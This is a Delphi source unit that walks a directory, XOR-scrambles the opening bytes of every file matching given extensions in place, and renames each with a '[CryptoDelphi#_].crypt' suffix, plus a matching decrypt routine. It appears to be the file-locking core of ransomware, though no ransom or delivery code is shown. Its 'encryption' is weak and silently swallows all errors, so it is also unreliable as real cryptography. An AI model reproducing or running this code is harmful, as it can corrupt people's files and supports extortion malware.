unit Controller.Crypto;

interface

uses
  SysUtils, Classes, System.Generics.Collections, System.IOUtils;

type
  TCryptoController = class
  public
    class function EncryptFilesInDirectory(const DirectoryPath, Key: string;
      const FileExtensions: TArray<string>): Boolean;

    class function DecryptFilesInDirectory(const DirectoryPath, Key: string;
      const FileExtensions: TArray<string>): Boolean;
  end;

implementation

class function TCryptoController.EncryptFilesInDirectory(const DirectoryPath,
  Key: string; const FileExtensions: TArray<string>): Boolean;
var
  SearchRec: TSearchRec;
  FilePath, NewFilePath: string;
  FileStream: TFileStream;
  Buffer: Byte;
  KeyIndex: Integer;
  FileExtension: string;
begin
  Result := False;
  try
    for FileExtension in FileExtensions do
    begin
      if FindFirst(TPath.Combine(DirectoryPath, '*' + FileExtension), faAnyFile,
        SearchRec) = 0 then
      begin
        repeat
          FilePath := TPath.Combine(DirectoryPath, SearchRec.Name);
          NewFilePath := TPath.Combine(DirectoryPath,
            SearchRec.Name + '[CryptoDelphi#_].crypt');
          FileStream := TFileStream.Create(FilePath, fmOpenReadWrite);
          try
            for KeyIndex := 1 to Length(Key) do
            begin
              if FileStream.Read(Buffer, 1) = 1 then
              begin
                Buffer := Buffer xor Ord(Key[KeyIndex]);
                FileStream.Seek(-1, soCurrent);
                FileStream.Write(Buffer, 1);
              end
              else
                Break;
            end;
          finally
            FileStream.Free;
          end;
          RenameFile(FilePath, NewFilePath);
        until FindNext(SearchRec) <> 0;
        Result := True;
      end;
      FindClose(SearchRec);
    end;
  except
  end;
end;

class function TCryptoController.DecryptFilesInDirectory(const DirectoryPath,
  Key: string; const FileExtensions: TArray<string>): Boolean;
var
  SearchRec: TSearchRec;
  FilePath, NewFilePath: string;
  FileStream: TFileStream;
  Buffer: Byte;
  KeyIndex: Integer;
  FileExtension: string;
begin
  Result := False;
  try
    for FileExtension in FileExtensions do
    begin
      if FindFirst(TPath.Combine(DirectoryPath, '*' + FileExtension +
        '[CryptoDelphi#_].crypt'), faAnyFile, SearchRec) = 0 then
      begin
        repeat
          FilePath := TPath.Combine(DirectoryPath, SearchRec.Name);
          NewFilePath := TPath.Combine(DirectoryPath,
            Copy(SearchRec.Name, 1, Length(SearchRec.Name) -
            Length('[CryptoDelphi#_].crypt')));
          FileStream := TFileStream.Create(FilePath, fmOpenReadWrite);
          try
            for KeyIndex := 1 to Length(Key) do
            begin
              if FileStream.Read(Buffer, 1) = 1 then
              begin
                Buffer := Buffer xor Ord(Key[KeyIndex]);
                FileStream.Seek(-1, soCurrent);
                FileStream.Write(Buffer, 1);
              end
              else
                Break;
            end;
          finally
            FileStream.Free;
          end;
          RenameFile(FilePath, NewFilePath);
        until FindNext(SearchRec) <> 0;
        Result := True;
      end;
      FindClose(SearchRec);
    end;
  except
  end;
end;

end.
